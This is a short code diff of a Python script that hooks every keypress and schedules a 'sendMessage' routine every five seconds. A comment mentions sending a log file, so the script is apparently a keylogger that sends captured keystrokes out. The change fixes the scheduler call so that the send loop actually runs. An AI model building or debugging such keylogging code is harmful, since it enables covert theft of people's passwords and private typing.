@@ -54,7 +54,7 @@ def main():
 
     keyboard.on_press(keyPress)
     #Send log file every day?  Needs function for that
-    schedule.every(5).seconds.do(sendMessage())
+    schedule.every(5).seconds.do(sendMessage)
 
 
     while True:
